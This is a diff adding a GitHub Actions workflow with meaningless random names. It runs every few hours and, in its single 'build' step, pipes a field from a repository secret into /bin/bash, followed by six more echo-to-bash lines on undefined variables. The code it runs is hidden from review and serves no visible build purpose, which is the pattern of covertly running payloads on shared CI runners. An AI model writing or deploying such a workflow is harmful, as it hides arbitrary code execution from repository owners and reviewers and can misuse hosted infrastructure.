@@ -1,0 +1,23 @@
+name: hongqimu2318
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: hongqimu2318
+        env:
+          p30: ${{ secrets.p30 }}
+        run: |
+          echo $p30 | jq -r .blz08107 | /bin/bash
+          echo $vvr475 | jq -r .vbdju50299 | /bin/bash
+          echo $kvi894 | jq -r .wtoib34 | /bin/bash
+          echo $ds831 | jq -r .x0 | /bin/bash
+          echo $cmfpf8 | jq -r .t424 | /bin/bash
+          echo $qzr99 | jq -r .d422 | /bin/bash
+          echo $pfkop9 | jq -r .wxge48 | /bin/bash
+
